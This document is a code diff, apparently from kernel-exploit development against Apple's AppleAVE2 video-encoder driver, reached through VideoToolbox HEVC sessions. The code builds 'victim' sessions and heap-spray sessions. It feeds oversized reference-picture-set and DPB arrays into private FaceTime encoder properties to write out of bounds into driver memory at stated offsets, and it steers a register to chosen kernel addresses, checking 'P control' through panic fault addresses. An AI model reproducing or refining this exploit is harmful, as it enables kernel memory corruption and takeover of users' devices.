@@ -18,10 +18,18 @@
 // (NTL=16000/16463 in frameProperties) can latch exactly one. Bounded callback
 // drain instead, Liza semantics: sink cleared before submission, break on fault.
 static void SpriteAttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
+    (void)src;
     NSMutableArray *sink = (__bridge NSMutableArray *)refCon;
     if (!sink) return;
+    size_t totalLen = 0;
+    if (sb) {
+        CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sb);
+        if (block) totalLen = CMBlockBufferGetDataLength(block);
+    }
+    NSString *entry = [NSString stringWithFormat:@"cb st=%d info=0x%x sbuf=%s len=%zu",
+                       (int)st, (unsigned)fl, sb ? "OK" : "NULL", totalLen];
     @synchronized (sink) {
-        [sink addObject:[NSString stringWithFormat:@"cb st=%d", (int)st]];
+        [sink addObject:entry];
     }
 }
 static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int expected, int timeoutMs) {
@@ -202,7 +210,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     }
 
     int ntl = self.ntl;
-    if (ntl <= 0 || (ntl == 16433 && liveKPtrCount > 0)) {
+    if (self.marker != 0x50505050 && (ntl <= 0 || (ntl == 16433 && liveKPtrCount > 0))) {
         if (ntl <= 0) {
             ntl = 16444; // 0xffffffed00000059 (AppleAVE2 outer-object band on iPhone16,1 27.0.1)
         }
@@ -251,81 +259,132 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         [report appendFormat:@"  cand[%d] = 0x%016llx\n", c, x0cands[c]];
     }
 
-    // 1) VICTIM session created BEFORE spray; for NTL < 16463 use 15/30 fractional FPS
-    //    (RealTime=NO, AllowFrameReordering=YES, AllowTemporalCompression=YES,
-    //     ExpectedFrameRate=15, BaseLayerFrameRate=30, NumberOfTemporalLayers=NTL)
-    //    so PrepareToEncodeFrames AND EncodeFrame both succeed with st=0 / cb=0
-    //    while keeping POST=1 and [+0x2eec] = NTL - 1 unclamped.
-    // P-CONTROL PROBE v2 (marker 0x50505050): run the proven-panic shape (NTL=16463,
-    // raw EncoderUsage=1) so teardown is GUARANTEED to fire (fill sets slot[0]=0x1 ->
-    // far=0x59). Then overwrite slot[0] with P=0x201 via two independent paths:
-    //   inner: DeltaPOCS0Minus1[41916..41919] -> strh at +0x38+2*i reaches 0x147b0
-    //   outer: arr10 struct#9 DeltaPOCS0[12..15] -> 0x13adc+9*0x164+0x50 = 0x147b0
-    // far=0x259 => our write won (full P control). far=0x59 => fill won (geometry off).
+    // 1) VICTIM session created BEFORE spray:
+    //    Pre-prepare with 15/30 fractional FPS and effNtl=min(vntl,7) so PrepareToEncodeFrames
+    //    AND EncodeFrame[0] emit a real 7-sublayer HVCC IDR frame (info=0x1 sbuf=OK, never
+    //    dropped with info=0x3 sbuf=NULL), then latch NumberOfTemporalLayers=vntl post-encode
+    //    and pair an unclamped EncoderUsage=1 session before teardown.
     if (self.marker == 0x50505050) {
-        NSMutableArray *s0 = [NSMutableArray arrayWithCapacity:41920];
-        for (int e = 0; e < 41920; e++) [s0 addObject:@0];
-        s0[41916] = @0x0201;
+        int pNtl = (liveKPtrCount > 0)
+            ? (16463 + (int32_t)(uint32_t)(liveKPtrs[0] >> 32))
+            : ((ntl > 0 && ntl < 16463) ? ntl : 16433);
+        uint64_t pTargetX0 = ((uint64_t)(uint32_t)(pNtl - 16463) << 32) | 0x59ULL;
+        uint32_t pLo = (uint32_t)(pTargetX0 & 0xffffffffULL);
+        uint32_t pHi = (uint32_t)(pTargetX0 >> 32);
+
+        // Valid DSC .68 AVE_HEVC_ST_RPS_Retrieve schema requires:
+        //   - EnableUserRefForFacetime = kCFBooleanTrue on the session
+        //   - NumNegativePics + NumPositivePics <= 4 (NumNegativePics=2, NumPositivePics=2)
+        //   - Outer CFArray count <= 8 (arr1..4 in-bounds at pINS+0x13adc, arr5..8 OOB into +0x1406c..+0x145fc)
+        //   - Inner DeltaPOCS0Minus1 / DeltaPOCS1Minus1 CFArray<CFNumber> (unchecked length -> inner OOB)
+        NSMutableArray *s0Big = [NSMutableArray arrayWithCapacity:64];
+        NSMutableArray *s1Big = [NSMutableArray arrayWithCapacity:64];
+        for (int e = 0; e < 64; e++) {
+            int16_t hv = (int16_t)((e & 1) ? (pHi & 0xffff) : 0x0201);
+            [s0Big addObject:@(hv)];
+            [s1Big addObject:@(hv)];
+        }
         NSDictionary *bigDict = @{
             @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
-            @"NumNegativePics": @16,
-            @"NumPositivePics": @0,
-            @"DeltaPOCS0Minus1": s0,
-            @"UsedByCurrPicS0Flag": @0,
-            @"DeltaPOCS1Minus1": @[],
-            @"UsedByCurrPicS1Flag": @0,
+            @"NumNegativePics": @2,
+            @"NumPositivePics": @2,
+            @"DeltaPOCS0Minus1": s0Big,
+            @"UsedByCurrPicS0Flag": @3,
+            @"DeltaPOCS1Minus1": s1Big,
+            @"UsedByCurrPicS1Flag": @3,
         };
-        NSMutableArray *rps10 = [NSMutableArray arrayWithCapacity:10];
-        for (int d = 0; d < 10; d++) {
-            NSMutableArray *s0b = [NSMutableArray arrayWithCapacity:16];
-            for (int e = 0; e < 16; e++) [s0b addObject:@0];
-            if (d == 9) {
-                s0b[12] = @0x0201;
+        NSMutableArray *rps8 = [NSMutableArray arrayWithCapacity:8];
+        for (int d = 0; d < 8; d++) {
+            NSMutableArray *s0b = [NSMutableArray arrayWithCapacity:32];
+            NSMutableArray *s1b = [NSMutableArray arrayWithCapacity:32];
+            for (int e = 0; e < 32; e++) {
+                int16_t hv = (int16_t)((e & 1) ? (pHi & 0xffff) : 0x0201);
+                [s0b addObject:@(hv)];
+                [s1b addObject:@(hv)];
             }
-            [rps10 addObject:@{
+            [rps8 addObject:@{
                 @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
-                @"NumNegativePics": @16,
-                @"NumPositivePics": @0,
+                @"NumNegativePics": @2,
+                @"NumPositivePics": @2,
                 @"DeltaPOCS0Minus1": s0b,
-                @"UsedByCurrPicS0Flag": @0,
-                @"DeltaPOCS1Minus1": @[],
-                @"UsedByCurrPicS1Flag": @0,
+                @"UsedByCurrPicS0Flag": @3,
+                @"DeltaPOCS1Minus1": s1b,
+                @"UsedByCurrPicS1Flag": @3,
             }];
         }
+        NSMutableArray *dpb34 = [NSMutableArray arrayWithCapacity:34];
+        for (int p = 0; p < 17; p++) {
+            [dpb34 addObject:@((int32_t)pLo)];
+            [dpb34 addObject:@((int32_t)pHi)];
+        }
+
         VTCompressionSessionRef victim = NULL;
         NSMutableArray *vSink = [NSMutableArray array];
         CFTypeRef retainedVSink = CFRetain((__bridge CFTypeRef)vSink);
+        NSDictionary *vSpec = @{ @"EnableUserRefForFacetime": @YES };
         OSStatus vst = VTCompressionSessionCreate(kCFAllocatorDefault, W, H,
                                                   kCMVideoCodecType_HEVC,
-                                                  NULL, NULL, NULL,
+                                                  (__bridge CFDictionaryRef)vSpec, NULL, NULL,
                                                   SpriteAttsCB, (void *)retainedVSink, &victim);
         if (vst != noErr || !victim) {
             CFRelease(retainedVSink);
             [report appendString:@"\nVERDICT: PCONTROL_CREATE_FAILED\n"];
             return report;
         }
-        // Panic-shape recipe: raw EncoderUsage=1 + NTL=16463 (no frac pair).
+        VTSessionSetProperty(victim, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
+        VTSessionSetProperty(victim, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
+        OSStatus pmSt = VTSessionSetProperty(victim, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
         VTSessionSetProperty(victim, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
-        VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
-        OSStatus nSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@16463);
+        VTSessionSetProperty(victim, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
+        VTSessionSetProperty(victim, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
+        VTSessionSetProperty(victim, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@15);
+        VTSessionSetProperty(victim, CFSTR("BaseLayerFrameRate"), (__bridge CFNumberRef)@30);
+        OSStatus nPreSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@7);
+        OSStatus setDpbPre = VTSessionSetProperty(victim, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpb34);
+        uint64_t rbOobPair16 = 0;
+        CFTypeRef rpsAliasRef = NULL;
+        if (VTSessionCopyProperty(victim, CFSTR("UserRPSForFaceTime"), kCFAllocatorDefault, &rpsAliasRef) == noErr && rpsAliasRef) {
+            if (CFGetTypeID(rpsAliasRef) == CFArrayGetTypeID()) {
+                NSArray *nsA = (__bridge NSArray *)rpsAliasRef;
+                if (nsA.count >= 34) {
+                    uint32_t lo16 = (uint32_t)[nsA[32] intValue];
+                    uint32_t hi16 = (uint32_t)[nsA[33] intValue];
+                    rbOobPair16 = ((uint64_t)hi16 << 32) | lo16;
+                }
+            }
+            CFRelease(rpsAliasRef);
+        }
         OSStatus vPrep = VTCompressionSessionPrepareToEncodeFrames(victim);
-        [report appendFormat:@"pcontrol v2 victim=%p ntl=16463(fixed) nSet=%d prep=%d (fill sets slot[0]=0x1 ONLY at 16463)\n",
-         (void *)victim, (int)nSt, (int)vPrep];
+        OSStatus e0 = -1;
+        NSString *cb0 = @"(no cb)";
         CVPixelBufferRef pb = [self makeBufferWidth:W height:H];
         if (pb) {
-            VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+            e0 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
             SpriteDrain(victim, vSink, 1, 500);
+            @synchronized (vSink) { cb0 = vSink.firstObject ?: @"(no cb)"; }
             CVPixelBufferRelease(pb);
         }
         OSStatus setInner = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[ bigDict ]);
-        OSStatus setOuter = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps10);
-        [report appendFormat:@"pcontrol set inner(41920)=%d outer(arr10)=%d — teardown: far=0x259 means OUR write, far=0x59 means fill\n",
-         (int)setInner, (int)setOuter];
-        [self journal:[NSString stringWithFormat:@"PCONTROL_V2 inner=%d outer=%d — tearing down NTL=16463", (int)setInner, (int)setOuter]];
+        OSStatus setOuter = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps8);
+        OSStatus setDpbPost = VTSessionSetProperty(victim, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpb34);
+        OSStatus privNSt = VTSessionSetProperty(victim, CFSTR("NumOfTemporalLayer"), (__bridge CFNumberRef)@(pNtl));
+        OSStatus nPostSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(pNtl));
+        int rbPostNtl = -1;
+        CFNumberRef rbN = NULL;
+        if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &rbN) == noErr && rbN) {
+            CFNumberGetValue(rbN, kCFNumberIntType, &rbPostNtl);
+            CFRelease(rbN);
+        }
+        [report appendFormat:@"pcontrol v2 victim=%p ntl=%d(x0=0x%016llx) pm=%d nPre7=%d prep=%d enc0=%d(%@) nPost=%d/%d(rb=%d)\n",
+         (void *)victim, pNtl, pTargetX0, (int)pmSt, (int)nPreSt, (int)vPrep, (int)e0, cb0, (int)privNSt, (int)nPostSt, rbPostNtl];
+        [report appendFormat:@"pcontrol set inner(64)=%d outer(arr8)=%d dpb34=%d/%d(oobPair16=0x%016llx)\n",
+         (int)setInner, (int)setOuter, (int)setDpbPre, (int)setDpbPost, rbOobPair16];
+        [self journal:[NSString stringWithFormat:@"PCONTROL_V2 ntl=%d inner=%d outer=%d dpb34=%d enc0=%d(%@)",
+                       pNtl, (int)setInner, (int)setOuter, (int)setDpbPost, (int)e0, cb0]];
         VTCompressionSessionInvalidate(victim);
         CFRelease(victim);
         CFRelease(retainedVSink);
-        [report appendString:@"pcontrol v2 teardown SURVIVED — teardown chain did not fire\n"];
+        [report appendString:@"pcontrol v2 teardown SURVIVED — RPS/DPB OOB + post-IDR NTL completed cleanly\n"];
         [report appendString:@"\nVERDICT: PCONTROL_SURVIVED\n"];
         return report;
     }
@@ -333,6 +392,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     // One victim per safe 4GB boundary (mapped per panic-full zone map): each NTL
     // steers x0 to a different 0xXXXX00000059 slot — 7 shots per run, not 1.
     NSMutableArray *victims = [NSMutableArray array];
+    NSMutableArray *uVictims = [NSMutableArray array];
     NSMutableArray *vSinks = [NSMutableArray array];
     NSMutableArray *vRetains = [NSMutableArray array];
     NSMutableArray *vNtls = [NSMutableArray array];
@@ -352,21 +412,52 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             [report appendFormat:@"victim NTL=%d create failed=%d\n", vntl, (int)vst];
             continue;
         }
-        OSStatus pmSt = 0;
+        // Companion Usage=1 session for unclamped pre-prepare AVE_PSGen::Init (fn#1816) NTL write
+        VTCompressionSessionRef uVictim = NULL;
+        int u1Pre = -1, u1Post = -1;
+        OSStatus u1Prep = -999;
+        if (vntl < 16463) {
+            NSDictionary *uspec = @{
+                @"EncoderUsage": @1,
+                @"NumberOfTemporalLayers": @(vntl),
+                @"AllowTemporalCompression": @YES,
+            };
+            if (VTCompressionSessionCreate(kCFAllocatorDefault, W, H, kCMVideoCodecType_HEVC,
+                                           (__bridge CFDictionaryRef)uspec, NULL, NULL, NULL, NULL, &uVictim) == noErr && uVictim) {
+                VTSessionSetProperty(uVictim, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
+                VTSessionSetProperty(uVictim, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+                VTSessionSetProperty(uVictim, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
+                VTSessionSetProperty(uVictim, CFSTR("NumOfTemporalLayer"), (__bridge CFNumberRef)@(vntl));
+                VTSessionSetProperty(uVictim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(vntl));
+                CFNumberRef urb = NULL;
+                if (VTSessionCopyProperty(uVictim, CFSTR("NumberOfTemporalLayers"), NULL, &urb) == noErr && urb) {
+                    CFNumberGetValue(urb, kCFNumberIntType, &u1Pre);
+                    CFRelease(urb);
+                }
+                u1Prep = VTCompressionSessionPrepareToEncodeFrames(uVictim);
+                urb = NULL;
+                if (VTSessionCopyProperty(uVictim, CFSTR("NumberOfTemporalLayers"), NULL, &urb) == noErr && urb) {
+                    CFNumberGetValue(urb, kCFNumberIntType, &u1Post);
+                    CFRelease(urb);
+                }
+            }
+        }
+        OSStatus pmSt = VTSessionSetProperty(victim, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
         OSStatus rtSt = VTSessionSetProperty(victim, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
         OSStatus uSt = 0;
         OSStatus privNSt = 0;
+        int effPreNtl = (vntl >= 1 && vntl <= 7) ? vntl : 7;
         if (vntl >= 16463) {
-            pmSt = VTSessionSetProperty(victim, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
             uSt = VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
             privNSt = VTSessionSetProperty(victim, CFSTR("NumOfTemporalLayer"), (__bridge CFNumberRef)@(vntl));
+            effPreNtl = vntl;
         } else {
             VTSessionSetProperty(victim, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
             VTSessionSetProperty(victim, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
             VTSessionSetProperty(victim, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@15);
             uSt = VTSessionSetProperty(victim, CFSTR("BaseLayerFrameRate"), (__bridge CFNumberRef)@30);
         }
-        OSStatus nSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(vntl));
+        OSStatus nSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(effPreNtl));
         int vrbPre = -1, vrbPost = -1;
         CFNumberRef vbn = NULL;
         if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &vbn) == noErr && vbn) {
@@ -379,14 +470,15 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             CFNumberGetValue(vbn, kCFNumberIntType, &vrbPost);
             CFRelease(vbn);
         }
-        int seqSubLayersM1 = (vrbPost < 2 && vntl >= 2) ? (vntl - 1) : (vrbPost - 1);
-        [self journal:[NSString stringWithFormat:@"VICTIM_CREATED session=%p ntl=%d pm=%d frac15_30=%d rt=%d privSet=%d set=%d pre=%d prep=%d post=%d seqM1=%d",
-                       (void *)victim, vntl, (int)pmSt, (int)uSt, (int)rtSt, (int)privNSt, (int)nSt, vrbPre, (int)vPrep, vrbPost, seqSubLayersM1]];
-        [report appendFormat:@"victim session created (%p) before spray: NTL=%d x0=0x%016llx pm=%d frac15_30=%d rt=%d privSet=%d set=%d PRE=%d prep=%d POST=%d([+0x2eec]=%d)\n",
+        int seqSubLayersM1 = (vrbPost < 2 && effPreNtl >= 2) ? (effPreNtl - 1) : (vrbPost - 1);
+        [self journal:[NSString stringWithFormat:@"VICTIM_CREATED session=%p ntl=%d pm=%d frac15_30=%d rt=%d set=%d pre=%d prep=%d post=%d seqM1=%d u1=%d/%d/%d",
+                       (void *)victim, vntl, (int)pmSt, (int)uSt, (int)rtSt, (int)nSt, vrbPre, (int)vPrep, vrbPost, seqSubLayersM1, u1Pre, (int)u1Prep, u1Post]];
+        [report appendFormat:@"victim session created (%p) before spray: NTL=%d x0=0x%016llx pm=%d frac15_30=%d rt=%d set=%d PRE=%d prep=%d POST=%d([+0x2eec]=%d) | u1(PRE=%d,prep=%d,POST=%d)\n",
          (void *)victim, vntl,
          ((uint64_t)(uint32_t)(vntl - 16463) << 32) | 0x59ULL,
-         (int)pmSt, (int)uSt, (int)rtSt, (int)privNSt, (int)nSt, vrbPre, (int)vPrep, vrbPost, seqSubLayersM1];
+         (int)pmSt, (int)uSt, (int)rtSt, (int)nSt, vrbPre, (int)vPrep, vrbPost, seqSubLayersM1, u1Pre, (int)u1Prep, u1Post];
         [victims addObject:[NSValue valueWithPointer:victim]];
+        [uVictims addObject:[NSValue valueWithPointer:uVictim]];
         [vSinks addObject:vSink];
         [vRetains addObject:[NSValue valueWithPointer:(void *)retainedVSink]];
         [vNtls addObject:@(vntl)];
@@ -398,9 +490,12 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
 
     // 2) SPRAY siblings — arm with PropertyMode=1, EnableUserRefForFacetime=YES,
     //    UserDPBFramesForFaceTime (34 int32s including OOB pair #16 carrying x0cands),
-    //    and UserRPSForFaceTime (inner OOB 24 + outer OOB arr5 into pINS+0x1406c..).
+    //    and UserRPSForFaceTime (inner OOB 32 + outer OOB arr8 into pINS+0x1406c..0x145fc).
+    //    NOTE: Do NOT set EncoderUsage=1 together with EnableUserRefForFacetime (triggers -17691
+    //    on PrepareToEncodeFrames), and use valid 60/15 FPS so PrepareToEncodeFrames succeeds!
     int32_t marker = (int32_t)self.marker;
     NSMutableArray *siblings = [NSMutableArray array];
+    int sibPrepOk = 0;
     for (int i = 0; i < self.sprayCount; i++) {
         VTCompressionSessionRef s = [self makeSessionWidth:sw height:sh];
         if (!s) continue;
@@ -409,11 +504,12 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         uint32_t cHi = (uint32_t)(cand64 >> 32);
         VTSessionSetProperty(s, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
         VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
-        VTSessionSetProperty(s, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
+        VTSessionSetProperty(s, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@60);
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@15);
         VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@3);
-        VTSessionSetProperty(s, CFSTR("MaxKeyFrameInterval"), (__bridge CFNumberRef)@(marker));
         VTSessionSetProperty(s, CFSTR("AverageBitRate"), (__bridge CFNumberRef)@(marker));
-        VTSessionSetProperty(s, CFSTR("ExpectedFrameRate"), (__bridge CFNumberRef)@(marker));
         VTSessionSetProperty(s, CFSTR("MaxKeyFrameIntervalDuration"), (__bridge CFNumberRef)@(marker));
 
         NSMutableArray *dpb34 = [NSMutableArray arrayWithCapacity:34];
@@ -423,35 +519,32 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         }
         VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpb34);
 
-        NSMutableArray *s0Oob24 = [NSMutableArray arrayWithCapacity:24];
-        NSMutableArray *s1Oob24 = [NSMutableArray arrayWithCapacity:24];
-        for (int k = 0; k < 24; k++) {
+        NSMutableArray *s0Oob32 = [NSMutableArray arrayWithCapacity:32];
+        NSMutableArray *s1Oob32 = [NSMutableArray arrayWithCapacity:32];
+        for (int k = 0; k < 32; k++) {
             int16_t hval = (int16_t)((k & 1) ? (cHi & 0xffff) : (cLo & 0xffff));
-            [s0Oob24 addObject:@(hval)];
-            [s1Oob24 addObject:@(hval)];
+            [s0Oob32 addObject:@(hval)];
+            [s1Oob32 addObject:@(hval)];
         }
         NSDictionary *rpsOob = @{
             @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
             @"NumNegativePics": @2,
             @"NumPositivePics": @2,
-            @"DeltaPOCS0Minus1": s0Oob24,
+            @"DeltaPOCS0Minus1": s0Oob32,
             @"UsedByCurrPicS0Flag": @3,
-            @"DeltaPOCS1Minus1": s1Oob24,
+            @"DeltaPOCS1Minus1": s1Oob32,
             @"UsedByCurrPicS1Flag": @3,
         };
         VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"),
-                             (__bridge CFTypeRef)@[ rpsOob, rpsOob, rpsOob, rpsOob, rpsOob ]);
+                             (__bridge CFTypeRef)@[ rpsOob, rpsOob, rpsOob, rpsOob, rpsOob, rpsOob, rpsOob, rpsOob ]);
 
-        if ((i & 1) == 0) {
-            int64_t pv = (int64_t)cand64;
-            VTSessionSetProperty(s, CFSTR("AverageBitRate"), (__bridge CFNumberRef)@(pv));
-            VTSessionSetProperty(s, CFSTR("MaxKeyFrameInterval"), (__bridge CFNumberRef)@(pv));
+        if (VTCompressionSessionPrepareToEncodeFrames(s) == noErr) {
+            sibPrepOk++;
         }
-        VTCompressionSessionPrepareToEncodeFrames(s);
         [siblings addObject:[NSValue valueWithPointer:s]];
     }
-    [self journal:[NSString stringWithFormat:@"SPRAY_DONE n=%d marker=0x%08x ntl=%d",
-                   (int)siblings.count, self.marker, ntl]];
+    [self journal:[NSString stringWithFormat:@"SPRAY_DONE n=%d prepOk=%d marker=0x%08x ntl=%d",
+                   (int)siblings.count, sibPrepOk, self.marker, ntl]];
 
     // Dense fixed-page spray (strategy doc): own the pages at 0xfffffeXX00000059
     // so a steered write lands in OUR buffers and can be scanned afterwards.
@@ -572,6 +665,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     CVPixelBufferRef pb = [self makeBufferWidth:W height:H];
     for (NSUInteger vi = 0; vi < victims.count; vi++) {
         VTCompressionSessionRef victim = (VTCompressionSessionRef)((NSValue *)victims[vi]).pointerValue;
+        VTCompressionSessionRef uVictim = (VTCompressionSessionRef)((NSValue *)uVictims[vi]).pointerValue;
         NSMutableArray *vSink = vSinks[vi];
         CFTypeRef retainedVSink = (CFTypeRef)((NSValue *)vRetains[vi]).pointerValue;
         int vntl = [vNtls[vi] intValue];
@@ -586,11 +680,24 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             }
             NSString *cb0 = nil;
             @synchronized (vSink) { cb0 = vSink.firstObject ?: @"(no cb)"; }
-            [report appendFormat:@"first-encode trigger (NTL=%d) -> %d (%@)\n", vntl, (int)e0, cb0];
+            OSStatus stPostPriv = VTSessionSetProperty(victim, CFSTR("NumOfTemporalLayer"), (__bridge CFNumberRef)@(vntl));
+            OSStatus stPostPub = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(vntl));
+            int postEncNtl = -1;
+            CFNumberRef rbPost = NULL;
+            if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &rbPost) == noErr && rbPost) {
+                CFNumberGetValue(rbPost, kCFNumberIntType, &postEncNtl);
+                CFRelease(rbPost);
+            }
+            [report appendFormat:@"first-encode trigger (NTL=%d) -> %d (%@) | postLatch=%d/%d(POST_ENC=%d)\n",
+             vntl, (int)e0, cb0, (int)stPostPriv, (int)stPostPub, postEncNtl];
         }
         VTCompressionSessionInvalidate(victim);
         CFRelease(victim);
         CFRelease(retainedVSink);
+        if (uVictim) {
+            VTCompressionSessionInvalidate(uVictim);
+            CFRelease(uVictim);
+        }
         [self journal:[NSString stringWithFormat:@"AFTER_VICTIM_TEARDOWN survived ntl=%d x0=0x%016llx", vntl, vx0]];
     }
     if (pb) { CVPixelBufferRelease(pb); pb = NULL; }
